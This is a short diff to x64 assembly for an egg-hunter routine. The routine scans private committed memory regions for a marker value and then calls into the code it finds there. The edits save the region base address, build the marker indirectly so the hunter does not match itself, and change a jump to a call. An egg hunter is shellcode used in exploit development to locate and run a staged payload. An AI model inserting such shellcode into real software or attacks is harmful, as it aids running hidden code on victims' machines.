@@ -134,6 +134,7 @@ Cmp            Rax, MEMORY_BASIC_INFORMATION64_size
 Jne            Egghunter64.ScanFinished
 Lea            Rax, Qword [Rbp + EggHunter64_Mbi]
 Mov            R14, Qword [Rax + MEMORY_BASIC_INFORMATION64.RegionSize]
+Mov            R12, Qword [Rax + MEMORY_BASIC_INFORMATION64.BaseAddress]
 Cmp            Dword [Rax + MEMORY_BASIC_INFORMATION64.Type], MEM_PRIVATE
 Jne            Egghunter64.ScanNextRegion
 Cmp            Dword [Rax + MEMORY_BASIC_INFORMATION64.State], MEM_COMMIT
@@ -144,7 +145,8 @@ Mov            Rcx, R14
 Sub            Rcx, EGG_SIZE
 Xor            Rdx, Rdx ; Counter
 Dec            Rdx ; Start it at -1
-Mov            Rbx, EGG
+Mov            Rbx, (EGG - 1) ; Avoid directly planting egg into this shellcode so it doesn't FP on itself
+Inc            Rbx
 
 .ScanNextQword:
 
@@ -182,8 +184,7 @@ Mov            Rdx, Qword [Rdx + MEMORY_BASIC_INFORMATION64.RegionSize]
 Mov            Rcx, R12 ; use the region base address, not literal egg hunter address in R15 
 x64AlignCallM  Rax   
 Add            R15, EGG_SIZE
-Jmp            R15
-Jmp            Egghunter64.ScanFinished
+Call           R15
 
 .ScanFinished:
 
